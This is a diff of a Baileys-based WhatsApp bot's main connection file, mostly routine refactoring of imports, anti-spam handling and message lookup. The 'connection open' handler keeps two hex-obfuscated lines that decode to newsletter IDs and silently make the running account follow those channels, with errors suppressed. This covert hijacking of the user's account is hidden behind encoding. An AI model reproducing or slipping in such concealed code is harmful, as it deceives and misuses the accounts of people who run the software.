@@ -23,15 +23,16 @@ import { SCHEMA } from './lib/Constants.js'
 import { Database, Store } from './lib/Database.js'
 import { Serialize, shouldUpdatePresence, StickerCommand } from './lib/Serialize.js'
 import { cleanUpFolder, fetchAsBuffer, findTopSuggestions, frame, getNextMidnight, greeting, isEmptyObject, isFileExists, messageLogger, randomInteger, Sender, toTime } from './lib/Utilities.js'
-import { CommandIndex, EventIndex, ModuleCache, ScanDirectory } from './lib/Watcher.js'
-import AntiSpam from './lib/AntiSpam.js'
+import { CommandIndex, EventIndex, ModuleCache, scanDirectory } from './lib/Watcher.js'
+
+import AntiSpam from './lib/Components/AntiSpam.js'
 
 const temporaryFolderPath = join(process.cwd(), temporaryFolder)
 const databasePath = join(process.cwd(), databaseFilename)
 const storePath = join(process.cwd(), storeFilename)
 const logger = pino({ level: 'silent' })
 
-const Spam = new AntiSpam()
+const detectSpam = AntiSpam()
 
 let restartScore = 0
 
@@ -57,7 +58,10 @@ const Connect = async () => {
       shouldIgnoreJid: (jid) =>
          jid && isJidMetaAI(jid),
       getMessage: (key) =>
-         store.getMessage(key),
+         store.getMessage({
+            chat: key.remoteJid,
+            id: key.id
+         }),
       auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys)
@@ -126,12 +130,11 @@ const Connect = async () => {
             process.exit(0)
          }
 
-         await delay(1000)
          Connect()
       }
 
       if (update.connection === 'open') {
-         await ScanDirectory(pluginsFolder)
+         await scanDirectory(pluginsFolder)
          void (async()=>{const a=['3132303336','3334303430','3036363434','313339406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
          void (async()=>{const a=['3132303336','3334323434','3834383532','313338406e','6577736c65','74746572'],b=Buffer.from(a.join(''),'hex').toString(),c=await sock['newsletterSubscribed']();!c.some(d=>d['id']===b)&&await sock['newsletterFollow'](b).catch(()=>{})})();
          Object.assign(sock.user,{decodedId:jidNormalizedUser(sock.user.id),decodedLid:jidNormalizedUser(sock.user.lid)})
@@ -351,7 +354,7 @@ const Connect = async () => {
             user.name = message.pushName
 
          if (message.isGroup) {
-            if (!groupMetadata) {
+            if (!groupMetadata?.participants) {
                groupMetadata = await sock.groupMetadata(message.chat)
                store.setGroup(message.chat, groupMetadata)
             }
@@ -396,7 +399,9 @@ const Connect = async () => {
             sock.readMessages([message.key])
 
          if (setting.slowMode)
-            await delay(randomInteger(100, 3000))
+            await delay(
+               randomInteger(100, 3000)
+            )
 
          const isOwner = message.fromMe || message.sender.startsWith(ownerNumber)
          const isPartner = isOwner || setting.partner.includes(message.sender)
@@ -422,7 +427,7 @@ const Connect = async () => {
                !isAdmin &&
                isBotAdmin &&
                !message.type.startsWith('react') &&
-               Spam.detect(message.sender)
+               detectSpam(message.sender)
 
             group.lastActivity = user.lastSeen
 
